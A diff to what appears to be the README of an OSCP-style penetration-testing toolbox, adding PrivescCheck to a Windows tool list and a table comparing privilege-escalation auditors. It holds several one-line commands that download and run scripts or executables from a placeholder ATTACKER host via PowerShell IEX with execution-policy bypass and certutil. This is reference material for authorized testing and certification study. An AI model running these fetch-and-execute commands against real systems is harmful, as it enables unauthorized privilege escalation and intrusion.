@@ -40,6 +40,7 @@ Custom path: `./toolbox.sh /opt/my-tools`
 │   ├── winPEASx86.exe          winPEAS (32-bit)
 │   ├── winPEAS.bat             winPEAS (batch fallback)
 │   ├── PowerUp.ps1             PowerShell privesc checks
+│   ├── PrivescCheck.ps1        Modern privesc audit (itm4n)
 │   ├── FullPowers.exe          Recover SeImpersonate
 │   ├── RunasCs.zip             Run commands as another user
 │   ├── nc64.exe                Netcat (64-bit)
@@ -150,13 +151,29 @@ scp user@ATTACKER:/home/kali/oscp-tools/linux/linpeas.sh /tmp/
 certutil -urlcache -f http://ATTACKER/windows/winPEASx64.exe C:\Windows\Temp\wp.exe
 C:\Windows\Temp\wp.exe
 
-# PowerUp
+# PrivescCheck — modern, thorough, actively maintained (by itm4n)
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/windows/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Report PrivescCheck -Format TXT"
+
+# PrivescCheck — quick run (no report file)
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/windows/PrivescCheck.ps1'); Invoke-PrivescCheck"
+
+# PowerUp — classic, checks services, registry, scheduled tasks
 powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/windows/PowerUp.ps1'); Invoke-AllChecks"
 
-# Seatbelt
+# Seatbelt — host survey
 certutil -urlcache -f http://ATTACKER/windows/sharp/Seatbelt.exe C:\Windows\Temp\sb.exe
 C:\Windows\Temp\sb.exe -group=all
 ```
+
+### When to Use Which
+
+| Tool | Best For | Type |
+|---|---|---|
+| **PrivescCheck** | Most thorough single-script audit — services, registry, credentials, scheduled tasks, DLL hijacking, writable paths. Use this first. | PowerShell |
+| **PowerUp** | Quick service/registry/autologon checks. Classic PEN-200 tool. | PowerShell |
+| **winPEAS** | Comprehensive with color output. Noisy but finds everything. | EXE |
+| **Seatbelt** | Host survey — installed software, browser data, env vars, firewall rules. | EXE |
+| **SharpUp** | Fast audit of common privesc vectors (compiled C#). | EXE |
 
 ### Token Impersonation (SeImpersonatePrivilege)
 
